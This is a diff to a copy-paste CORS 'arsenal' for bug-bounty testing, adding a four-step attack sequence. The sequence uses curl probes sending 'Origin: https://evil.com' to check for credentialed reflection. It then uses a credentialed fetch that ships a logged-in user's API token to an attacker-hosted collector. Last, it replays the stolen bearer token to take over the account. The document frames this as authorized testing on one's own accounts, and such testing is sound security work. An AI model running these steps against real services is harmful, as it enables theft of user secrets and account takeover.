@@ -1,8 +1,31 @@
 # CORS Arsenal — Origin Payloads, Bypass Strings & Exfil Snippets (copy-paste)
 
+**Author:** x8bitranjit
+
 > Companion to `CORS_TESTING_GUIDE.md`. Everything here is for **authorized** testing with **your own** accounts.
 > The win condition is always: an **attacker-controlled origin (or `null`) reflected into `Access-Control-Allow-Origin`
 > with `Access-Control-Allow-Credentials: true`**, on a response that holds a **real secret**.
+
+---
+
+## 0. The whole attack in one sequence (the shape of every paid CORS bug — see Guide §11.1)
+*What & when:* the fastest way to hold the method in your head before the payload sections. Every CORS bug that pays follows this arc — only the way you get *trusted* (reflect / `null` / suffix-bypass / taken-over subdomain) changes.
+```bash
+# 1) BASELINE (§4): is an attacker origin reflected WITH credentials on a secret-bearing endpoint?
+curl -s -D- -o/dev/null -H "Origin: https://evil.com" https://api.target.com/api/me | grep -i 'access-control'
+#    WANT:  access-control-allow-origin: https://evil.com   +   access-control-allow-credentials: true   ⭐
+#    (send 2 more random origins — each echoed = reflect-any. No ACAC / no secret in body = Info, keep looking.)
+
+# 2) EXPLOIT (§11): host exfil.html on YOUR origin; log in as YOUR test account A; open the page in the same browser:
+#      fetch('https://api.target.com/api/me',{credentials:'include'}) -> ships A's secret to your collector
+#    -> your collector receives A's {"apiToken":"sk_live_..."} = attacker.com READ A's private response ⭐
+
+# 3) ATO (§12): replay the leaked secret from a clean client (no cookie) -> server treats you AS A:
+curl -s -H "Authorization: Bearer sk_live_..." https://api.target.com/api/me    # returns A's identity = takeover
+
+# 4) PROVE with your OWN account, REDACT the token in the report, STOP (§20).
+#    Variants: Origin: null -> sandboxed iframe (§4) ; *.target.com -> subdomain takeover/XSS (Guide §9).
+```
 
 ---
 
